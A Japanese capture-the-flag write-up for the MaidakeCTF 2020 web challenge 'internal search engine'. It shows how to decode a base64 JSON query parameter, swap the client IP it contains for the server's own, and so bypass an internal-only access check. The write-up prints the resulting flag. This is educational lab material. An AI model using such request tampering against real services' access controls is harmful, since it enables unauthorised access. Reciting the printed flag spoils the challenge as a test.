# 社内用検索エンジン:Web:300pts
社内でしか使えない検索エンジンを作りました。 [https://aokakes.work/MaidakeCTF2020/shanai/](https://aokakes.work/MaidakeCTF2020/shanai/)  
Hint  
問題が置いてあるaokakes.workはどこにあるのか確認するのです...  

# Solution
URLにアクセスすると、社内専用の検索ページのようだ。  
社内用検索エンジン  
[site.png](site/site.png)  
検索を行おうとすると
```text
社外からのアクセスを検知しました。
本検索エンジンは社内でのみ使用可能です。
```text
とのアラートが表示される。  
攻略不可能に思われるが、URLが以下のように変化していた。  
```
https://aokakes.work/MaidakeCTF2020/shanai/?page=eyJpcCI6IjIxOS4xMjYuMTkxLjE4IiwidGFyZ2V0IjoiTWFpZGFrZUNURiJ9
```
base64をデコードすると以下になる。  
```text
eyJpcCI6IjIxOS4xMjYuMTkxLjE4IiwidGFyZ2V0IjoiTWFpZGFrZUNURiJ9
{"ip":"219.126.191.18","target":"MaidakeCTF"}
```
ipがクエリに含まれているようだ。  
ipをaokakes.workのものに変更する。  
```bash
$ host aokakes.work
aokakes.work has address 18.177.12.46
```
base64エンコードする。  
```text
{"ip":"18.177.12.46","target":"MaidakeCTF"}
eyJpcCI6IjE4LjE3Ny4xMi40NiIsInRhcmdldCI6Ik1haWRha2VDVEYifQ==
```
クエリを変更してアクセスするとflagが表示された。  
flag  
[flag.png](site/flag.png)  

## MaidakeCTF{It_is_difficult_to_spoof_the_global_IP_on_the_client_side}